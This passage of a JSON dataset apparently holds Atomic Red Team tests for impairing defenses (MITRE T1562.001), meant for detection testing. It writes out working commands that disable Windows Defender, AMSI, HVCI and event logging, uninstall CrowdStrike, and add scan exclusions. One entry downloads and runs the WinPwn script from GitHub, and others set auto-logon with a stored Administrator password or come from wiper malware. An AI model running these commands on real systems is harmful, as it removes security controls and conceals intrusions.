        "Command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\"\nNew-Item -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\" -Name \"VBAWarnings\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableInternetFilesInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableUnsafeLocationsInPV\" -Value \"1\" -PropertyType \"Dword\"\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\ProtectedView\" -Name \"DisableAttachementsInPV\" -Value \"1\" -PropertyType \"Dword\"\n",
        "Description": "Gorgon group may disable Office security features so that their code can run. Upon execution, an external document will not\nshow any warning before editing the document.\n\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 51,
        "Command": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All\n",
        "Description": "Removing definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.\nOn later viersions of windows (1909+) this command fails even with admin due to inusfficient privelages. On older versions of windows the\ncommand will say completed.\n\nhttps://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 52,
        "Command": "Stop-Service -Name McAfeeDLPAgentService\nRemove-Service -Name McAfeeDLPAgentService\n",
        "Description": "Beginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 53,
        "Command": "if (Test-Path \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\") {. \"C:\\ProgramData\\Package Cache\\{7489ba93-b668-447f-8401-7e57a6fe538d}\\WindowsSensor.exe\" /repair /uninstall /quiet } else { Get-ChildItem -Path \"C:\\ProgramData\\Package Cache\" -Include \"WindowsSensor.exe\" -Recurse | % { $sig=$(Get-AuthenticodeSignature -FilePath $_.FullName); if ($sig.Status -eq \"Valid\" -and $sig.SignerCertificate.DnsNameList -eq \"CrowdStrike, Inc.\") { . \"$_\" /repair /uninstall /quiet; break;}}}",
        "Description": "Uninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 54,
        "Command": "$excludedpath= \"C:\\Temp\"\nAdd-MpPreference -ExclusionPath $excludedpath",
        "Description": "Malware can exclude a specific path from being scanned and evading detection. \nUpon successul execution, the file provided should be on the list of excluded path. \nTo check the exclusion list using poweshell (Get-MpPreference).ExclusionPath \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 55,
        "Command": "$excludedExts= \".exe\"\nAdd-MpPreference -ExclusionExtension  $excludedExts",
        "Description": "Malware can exclude specific extensions from being scanned and evading detection. \nUpon successful execution, the extension(s) should be on the list of excluded extensions.\nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionExtension.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 56,
        "Command": "$excludedProcess = \"outlook.exe\"\nAdd-MpPreference -ExclusionProcess $excludedProcess",
        "Description": "Malware can exclude specific processes from being scanned and evading detection.\nUpon successful execution, the process(es) should be on the list of excluded processes. \nTo check the exclusion list using poweshell  (Get-MpPreference).ExclusionProcess.\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 57,
        "Command": "$secure_pwd = \"\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\n$test = Get-AntiPhishRule\nDisable-AntiPhishRule -Identity $test.Name -Confirm:$false\nGet-AntiPhishRule\n",
        "Description": "Using the Disable-AntiPhishRule cmdlet to disable antiphish rules in your office-365 organization.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 58,
        "Command": "Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet",
        "Description": "The following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool. \nDISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's package.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 59,
        "Command": "Try {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\sc.exe\" /WindowState 0 /CommandLine \"stop WinDefend\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\nif(0){\n  $CommandToRun = rmdir \"$env:programdata\\Microsoft\\Windows Defender\" -Recurse\n  Try {cmd /c \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdvancedRun.exe\" /EXEFilename \"$env:systemroot\\System32\\WindowsPowershell\\v1.0\\powershell.exe\" /WindowState 0 /CommandLine \"$CommandToRun\" /StartDirectory \"\" /RunAs 8 /Run} Catch{}\n}\n",
        "Description": "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 60,
        "Command": "& \"PathToAtomicsFolder\\..\\ExternalPayloads\\Backstab64.exe\" -k -n MsMpEng.exe\n",
        "Description": "Backstab loads Process Explorer driver which is signed by Microsoft and use it to terminate running processes protected by antimalware software such as MsSense.exe or MsMpEng.exe, which is otherwise not possible to kill.\nhttps://github.com/Yaxser/Backstab",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 61,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ninv-phantom -consoleoutput -noninteractive  ",
        "Description": "Kill the event log services for stealth via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 62,
        "Command": "Set-MpPreference -drtm $True\nSet-MpPreference -dbm $True\nSet-MpPreference -dscrptsc $True\nSet-MpPreference -dbaf $True\n",
        "Description": "Attempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled\nin Windows settings.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 63,
        "Command": "reg add \"HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n",
        "Description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 64,
        "Command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d Administrator /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword /t REG_SZ /d password1 /f\n",
        "Description": "LockBit Black - Use Registry Editor to turn on automatic logon\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 65,
        "Command": "New-ItemProperty \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\OOBE\" -Name DisablePrivacyExperience -PropertyType DWord -Value 1 -Force\n",
        "Description": "LockBit Black - Disable Privacy Settings Experience Using Registry\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 66,
        "Command": "New-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name AutoAdminLogon -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultUserName -Value Administrator -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultDomainName -Value contoso.com -Force\nNew-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name DefaultPassword  -Value password1 -Force\n",
        "Description": "Lockbit Black - Use Registry Editor to turn on automatic logon\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 67,
        "Command": "Disable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Gui\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-Features\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender\" -NoRestart -ErrorAction Ignore\nDisable-WindowsOptionalFeature -Online -FeatureName \"Windows-Defender-ApplicationGuard\" -NoRestart -ErrorAction Ignore",
        "Description": "The following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool. \nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images.\nA successful execution will not standard-out any details. Remove the quiet switch if verbosity is needed.\nThis method will remove Defender and it's packages.\nReference: https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 68,
        "Command": "wmic.exe /Namespace:\\\\root\\Microsoft\\Windows\\Defender class MSFT_MpPreference call Add ExclusionPath=\\\"ATOMICREDTEAM\\\"\n",
        "Description": "The following Atomic will attempt to exclude a folder within Defender leveraging WMI\nReference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 69,
        "Command": "IF EXIST \"%temp%\\Windows_Defender_Scheduled_Scan.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cleanup.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Verification.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /f )\nIF EXIST \"%temp%\\Windows_Defender_Cache_Maintenance.xml\" ( schtasks /delete /tn \"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /f )\n",
        "Description": "The following atomic test will delete the Windows Defender scheduled tasks.\n\n[Reference](https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 70,
        "Command": "history -c\n",
        "Description": "Clear Shell History. This technique only affect the bash shell application. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 71,
        "Command": "set +o history\n",
        "Description": "suspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 72,
        "Command": "echo 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n",
        "Description": "reboot system via system request seen in Awfulshred wiper.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 73,
        "Command": "free && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches \n",
        "Description": "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 74,
        "Command": "swapon -a \nsleep 2\nswapoff -a\nsync\n",
        "Description": "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 75,
        "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f\n",
        "Description": "This test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 76,
        "Command": "REG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f\n",
        "Description": "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 77,
        "Command": "detectorId=$(aws guardduty create-detector --enable --region \"us-east-1\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId\n",
        "Description": "Enables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "bash"
    },
    {
        "ID": 78,
        "Command": "sudo mdatp config real-time-protection --value disabled\n",
        "Description": "With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "sh"
    },
    {
        "ID": 79,
        "Command": "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\n",
        "Description": "Disable Windows Defender by tampering with windows defender registry using the utility \"reg.exe\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 80,
        "Command": "Set-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 1  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 0 \nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 0 \n",
        "Description": "Disable Windows Defender by tampering with windows defender registry through powershell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 81,
        "Command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server atomic.local -User root -Password pass\nGet-AdvancedSetting -Entity atomic.local -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false\n",
        "Description": "An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 82,
        "Command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager\"\n\nif (-not (Test-Path $registryPath)) {\n  New-Item -Path $registryPath -Force\n  Write-Host \"Registry key created: $registryPath\"\n}\n\n$registryValueName = \"ASRRules\"\n\nif (Test-Path \"$registryPath\\$registryValueName\") {\n  Remove-ItemProperty -Path $registryPath -Name $registryValueName\n  Write-Host \"Registry value deleted: $registryValueName\"\n} else {\n  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value \"36190899-1602-49e8-8b27-eb1d0a1ce869=1\" -Force\n  Write-Host \"Registry value created: $registryValueName\"\n}\n\n\nRemove-ItemProperty -Path $registryPath -Name $registryValueName\nWrite-Host \"Registry value deleted: $registryValueName\"",
        "Description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates an InTune-based rules deployment.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 83,
        "Command": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\Rules\"\n\nif (-not (Test-Path $registryPath)) {\n\\tNew-Item -Path $registryPath -Force\n\\tWrite-Host \"Registry key created: $registryPath\"\n}\n\n$newValueName = \"36190899-1602-49e8-8b27-eb1d0a1ce869\"\n$newValueData = \"1\"\nNew-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force\nWrite-Host \"Registry value created: $newValueName with data $newValueData\"\n\nRemove-ItemProperty -Path $registryPath -Name $newValueName\nWrite-Host \"Registry value deleted: $newValueName\"",
        "Description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates a GPO-based rules deployment.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 84,
        "Command": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null\n",
        "Description": "Threat Actor could disable the AMSI function by adding a registry value name “AmsiEnable” to the registry key “HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable” and set its value to 0.\nRef: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 85,
        "Command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
        "Description": "This atomic simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 86,
        "Command": "New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application -Name Start -Value 0 -PropertyType \"DWord\" -Force",
        "Description": "This atomic simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
    {
        "ID": 87,
        "Command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\{B6D775EF-1436-4FE6-BAD3-9E436319E218}\" /v \"Enabled\" /t REG_DWORD /d \"0\" /f",
        "Description": "This atomic simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 88,
        "Command": "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\{B6D775EF-1436-4FE6-BAD3-9E436319E218}\" -Name Enabled -Value 0 -PropertyType \"DWord\" -Force",
        "Description": "This atomic simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.001",
        "Shell": "powershell"
    },
